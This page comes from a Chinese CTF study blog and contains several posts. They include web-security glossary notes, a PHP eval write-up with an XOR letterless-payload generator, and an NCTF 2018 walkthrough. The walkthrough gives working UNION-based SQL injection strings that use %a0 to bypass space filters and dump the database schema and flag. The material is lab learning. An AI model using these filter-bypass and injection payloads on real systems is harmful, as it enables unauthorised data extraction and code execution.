+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>此为个人理解，争取往大白话，口语化方向看齐。</p>
+<h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><h1 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h1><h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><h1 id="CMD指纹"><a href="#CMD指纹" class="headerlink" title="CMD指纹"></a>CMD指纹</h1><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><h1 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h1><p>没有被公开发表的漏洞。也就是说你做这道题不可以查已经发表的CVE来复现得到flag。</p>
+<h1 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h1><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><h1 id="webshell-shell-web"><a href="#webshell-shell-web" class="headerlink" title="webshell shell web"></a>webshell shell web</h1><h1 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie session token"></a>cookie session token</h1><h1 id="jwt-js"><a href="#jwt-js" class="headerlink" title="jwt js"></a>jwt js</h1><p>JWT 由三部分组成： Header 头部、 Payload 负载 和 Signature 签名，它是一个很长的字符串，中间用点（.）隔开。客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Header</span>.<span class="property">Payload</span>.<span class="property">Signature</span></span><br></pre></td></tr></table></figure>
+
+<p>长这样：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;姓名&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">  <span class="string">&quot;角色&quot;</span>: <span class="string">&quot;管理员&quot;</span>,</span><br><span class="line">  <span class="string">&quot;到期时间&quot;</span>: <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="结"><a href="#结" class="headerlink" title="结"></a>结</h3><table>
+<thead>
+<tr>
+<th align="left">部分</th>
+<th align="left">是否可解码？</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Header</td>
+<td align="left">✅ 可解码</td>
+<td align="left">声明算法和类型</td>
+</tr>
+<tr>
+<td align="left">Payload</td>
+<td align="left">✅ 可解码</td>
+<td align="left">携带实际数据（如用户信息）</td>
+</tr>
+<tr>
+<td align="left">Signature</td>
+<td align="left">❌ 不可解码</td>
+<td align="left">验证 Token 的合法性</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/21/CS%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/21/CS%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">CS自学指南笔记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-21 10:50:45" itemprop="dateCreated datePublished" datetime="2025-02-21T10:50:45+08:00">2025-02-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-22 20:41:16" itemprop="dateModified" datetime="2025-02-22T20:41:16+08:00">2025-02-22</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/21/CS%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/21/CS%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>11</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><a target="_blank" rel="noopener" href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">提问的智慧</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md">命令行的艺术</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/20/%E3%80%8A%E8%AE%A1%E7%BD%91%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E3%80%8B%E4%BD%A0%E8%AE%B0%E5%BE%97%E4%BB%80%E4%B9%88%E9%83%BD%E9%BB%98%E4%B8%8B%E6%9D%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/20/%E3%80%8A%E8%AE%A1%E7%BD%91%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E3%80%8B%E4%BD%A0%E8%AE%B0%E5%BE%97%E4%BB%80%E4%B9%88%E9%83%BD%E9%BB%98%E4%B8%8B%E6%9D%A5/" class="post-title-link" itemprop="url">《计网自顶向下》你记得什么都默下来</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-20 22:01:22" itemprop="dateCreated datePublished" datetime="2025-02-20T22:01:22+08:00">2025-02-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-22 20:41:57" itemprop="dateModified" datetime="2025-02-22T20:41:57+08:00">2025-02-22</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/20/%E3%80%8A%E8%AE%A1%E7%BD%91%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E3%80%8B%E4%BD%A0%E8%AE%B0%E5%BE%97%E4%BB%80%E4%B9%88%E9%83%BD%E9%BB%98%E4%B8%8B%E6%9D%A5/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/20/%E3%80%8A%E8%AE%A1%E7%BD%91%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E3%80%8B%E4%BD%A0%E8%AE%B0%E5%BE%97%E4%BB%80%E4%B9%88%E9%83%BD%E9%BB%98%E4%B8%8B%E6%9D%A5/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>0</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/20/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/20/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell/" class="post-title-link" itemprop="url">[HUBUCTF 2022 新生赛]HowToGetShell</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-20 21:41:05 / 修改时间：21:55:56" itemprop="dateCreated datePublished" datetime="2025-02-20T21:41:05+08:00">2025-02-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/20/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/20/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>208</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>其实本来是想取反绕过的，但是没反应也没有触发过滤，就很奇怪，理论上能在本地跑个源代码，但是为啥跑出来是源代码呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$mess=&#x27;(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);&#x27;;</span><br><span class="line">if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123;</span><br><span class="line">    die(&quot;invalid input!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($mess);</span><br></pre></td></tr></table></figure>
+
+<p>deepseek稍后再试，豆包法律风险，GPT开着代理还说两句就不理人，kimi销声匿迹，文心一言不语知识一昧的说有法律风险，你们五个真的是 让我选不出来一个</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span>    <span class="comment">#可以过的字母</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(tmp1,tmp2)</span><br></pre></td></tr></table></figure>
+
+<p>偷个脚本</p>
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0302181    @[@[_^^</span><br></pre></td></tr></table></figure>
+
+
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>明天要在平板上远程控制问的问题：</p>
+<h1 id="是什么？"><a href="#是什么？" class="headerlink" title="$_ ;$_(); 是什么？"></a>$_ ;$_(); 是什么？</h1>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/19/%E6%88%91%E6%9C%89%E5%B7%A8%E7%89%A9%E6%81%90%E6%83%A7%E7%97%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/19/%E6%88%91%E6%9C%89%E5%B7%A8%E7%89%A9%E6%81%90%E6%83%A7%E7%97%87/" class="post-title-link" itemprop="url">我有巨物恐惧症</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-02-19 17:35:34" itemprop="dateCreated datePublished" datetime="2025-02-19T17:35:34+08:00">2025-02-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-02-20 22:00:09" itemprop="dateModified" datetime="2025-02-20T22:00:09+08:00">2025-02-20</time>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/19/%E6%88%91%E6%9C%89%E5%B7%A8%E7%89%A9%E6%81%90%E6%83%A7%E7%97%87/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/19/%E6%88%91%E6%9C%89%E5%B7%A8%E7%89%A9%E6%81%90%E6%83%A7%E7%97%87/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>24</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>我不明白怎么有这么多工具这么多命令这么多魔术方法</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/" class="post-title-link" itemprop="url">[NCTF 2018]滴!晨跑打卡</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-19 17:00:13 / 修改时间：17:57:03" itemprop="dateCreated datePublished" datetime="2025-02-19T17:00:13+08:00">2025-02-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>154</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>SQL注入<img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-171610.png" class="" title="QQ20250219-171610"></p>
+<p>FUZZ看屏蔽什么</p>
+<h1 id="空格-a0"><a href="#空格-a0" class="headerlink" title="空格 %a0"></a>空格 %a0</h1><h1 id="‘’-27"><a href="#‘’-27" class="headerlink" title="‘’ %27"></a>‘’ %27</h1><img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-174605.png" class="" title="QQ20250219-174605">
+
+<p>发现有4列，同时发现后面要加上引号闭合（为啥不用注释呢？）</p>
+<blockquote>
+<p>2、用%a0绕过，输入1’%a0union%a0select%a01,2,3’，发现有4列，同时发现后面要加上引号闭合<br>3、1%27%a0union%a0select%a01,2,3,4%27,回显1,2，3<br>4、查库名：1%27%a0union%a0select%a01,2,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),4%27<br>5、查表名：1%27%a0union%a0select%a01,2,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema&#x3D;database()),4%27<br>6、查列名：1%27%a0union%a0select%a01,2,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name&#x3D;‘pcnumber’),4%27 (报错)<br>7、查字段值：1%27%a0union%a0select%a01,2,(select%a0group_concat(flag)%a0from%a0pcnumber),4%27</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/" class="post-title-link" itemprop="url">永远追不上的时间</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-19 16:57:03 / 修改时间：17:05:21" itemprop="dateCreated datePublished" datetime="2025-02-19T16:57:03+08:00">2025-02-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Index/" itemprop="url" rel="index"><span itemprop="name">Index</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/19/%E6%B0%B8%E8%BF%9C%E8%BF%BD%E4%B8%8D%E4%B8%8A%E7%9A%84%E6%97%B6%E9%97%B4/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>152</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>12.20下课</p>
+<p>13.00吃完麦当劳 走路回宿舍</p>
+<p>玩了一会儿手机，头不太舒服，睡了一会儿（本来只想咪到2点）</p>
+<p>15.00醒了，穿衣服，下楼洗澡</p>
+<p>15.40洗完了（没洗头所以不用吹头发）烧水，玩了五分钟NS</p>
+<p>16.10出门吃饭，瓦香鸡等了十分钟，</p>
+<p>16.57 到俱乐部，写博客</p>
+<p>实际上这已经是非常非常避开人流的作息了…如果不要求自己下午一定要来电脑面前一会儿就好很多…但是还有晚自习晚上只能学一个小时QAQ</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">温柔刀</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">10k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">35 分钟</span>
+  </span>
+</div>
